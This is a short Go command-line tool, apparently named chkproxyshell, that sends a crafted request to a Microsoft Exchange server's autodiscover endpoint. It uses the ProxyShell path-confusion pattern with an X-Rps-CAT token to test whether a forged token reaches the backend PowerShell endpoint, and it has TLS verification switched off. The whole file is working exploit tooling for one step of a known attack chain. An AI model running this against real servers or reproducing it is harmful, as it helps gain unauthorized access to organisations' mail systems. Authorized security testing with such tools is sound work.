package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"net/http"
	"strings"
	"time"
)

func confirmtoken(target, token string) {
	cli := &http.Client{Timeout: time.Second * 7, Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}}
	if !strings.Contains(target, "http") {
		target = "http://" + target
	}

	endpoint_addr := "/autodiscover/autodiscover.json?a=luci@ex.com/powershell/?X-Rps-CAT="

	request, err := http.NewRequest(http.MethodGet, target+endpoint_addr+token, nil)
	if err != nil {
		fmt.Println(err)
	}

	request.Header.Add("Accept-Encoding", "identity")
	request.Header.Add("Cookie", "Email=autodiscover/autodiscover.json?a=luci@ex.com")
	request.Header.Add("Content-Type", "application/soap+xml;charset=UTF-8")

	do, err := cli.Do(request)
	if err != nil {
		fmt.Println("[-] requesting err...")
		return
	}

	defer func() {
		_ = do.Body.Close()
	}()

	if do.StatusCode == 200 {
		fmt.Println("[+] the input token is valid to use!")
	} else {
		fmt.Println("[-] the input token is invalid!")
	}
}

func main() {
	var target, token string
	flag.StringVar(&target, "u", "", "")
	flag.StringVar(&token, "t", "", "")
	flag.CommandLine.Usage = func() {
		fmt.Println("usage：\nexec: ./chkproxyshell -u <target url> -t <token>\n")
	}
	flag.Parse()

	if len(target) == 0 {
		fmt.Println("[+] please enter the url you want to check!!!")
		fmt.Println("[+] Author: https://github.com/FDlucifer, https://twitter.com/fdlucifer11")
	} else if len(token) == 0 {
		fmt.Println("[+] please enter the token you want to check!!!")
		fmt.Println("[+] Author: https://github.com/FDlucifer, https://twitter.com/fdlucifer11")
	}
	confirmtoken(target, token)
}
